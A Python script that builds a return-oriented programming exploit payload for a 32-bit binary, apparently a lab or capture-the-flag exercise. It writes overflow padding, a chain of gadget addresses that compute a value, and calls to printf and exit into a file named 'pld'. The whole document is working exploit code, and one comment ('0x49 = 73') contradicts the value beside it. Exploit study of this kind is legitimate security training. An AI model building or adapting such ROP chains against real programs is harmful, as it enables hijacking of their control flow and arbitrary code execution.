import binascii

def convert_to_little_endian(hex_num):

    # Convert the hexadecimal number to bytes
    byte_data = binascii.unhexlify(hex_num)
    
    # Reverse the byte order to get little-endian representation
    little_endian = byte_data[::-1]
    
    return little_endian

##############################################################################

initial_padding = b"A" * 40

payload = initial_padding

# (0x080b1145 : pop edx ; xor eax, eax ; pop edi ; ret)

addr_1 = "080b1145"
arg_1_1 = "0000001c"
arg_1_2 = "00000000"

payload += convert_to_little_endian(addr_1)
payload += convert_to_little_endian(arg_1_1)
payload += convert_to_little_endian(arg_1_2)

# (0x080cf49a : pop eax ; ret)

addr_2 = "080cf49a"
#0x49 = 73
arg_2 = "00000015"

payload += convert_to_little_endian(addr_2)
payload += convert_to_little_endian(arg_2)

# (0x0804901e : pop ebx ; ret)

addr_3 = "0804901e"
#0x15 = 21
arg_3 = "00000015"

payload += convert_to_little_endian(addr_3)
payload += convert_to_little_endian(arg_3)

# (0x08049765 : imul eax, ebx ; add eax, 0xa ; ret)

addr_4 = "08049765"

payload += convert_to_little_endian(addr_4)

# (0x080915f3 : pop ecx ; ret)

addr_5 = "080915f3"
arg_5 = "00000005"

payload += convert_to_little_endian(addr_5)
payload += convert_to_little_endian(arg_5)

# (0x0804977c : sub eax, ecx ; ret)

addr_6 = "0804977c"

payload += convert_to_little_endian(addr_6)

# (0x080915f3 : pop ecx ; ret)

addr_7 = "080915f3"
arg_7 = "00000005"

payload += convert_to_little_endian(addr_7)
payload += convert_to_little_endian(arg_7)

# (0x0804977c : sub eax, ecx ; ret)

addr_8 = "0804977c"

payload += convert_to_little_endian(addr_8)

# (0x08049e78 : add esp, 4 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret)

addr_9 = "08049e78"

payload += convert_to_little_endian(addr_9)

# Padding of 8 Bytes

payload += b"A" * 8

# Printing

printf_address = "08052230"
exit_address = "08050c60"
format_specifier = "080d3037"

payload += convert_to_little_endian(printf_address)
payload += convert_to_little_endian(exit_address)
payload += convert_to_little_endian(format_specifier)

# (0x080c6fbc : push eax ; pop ebx ; pop esi ; pop edi ; ret)

addr_10 = "080c6fbc"

payload += convert_to_little_endian(addr_10)

# Padding of 8 bytes

payload += b"A" * 8

# (0x08049786 : sub esp, edx ; ret)

addr_11 = "08049786"

payload += convert_to_little_endian(addr_11)

#print(payload)
with open("pld","wb") as fptr:
   fptr.write(payload)
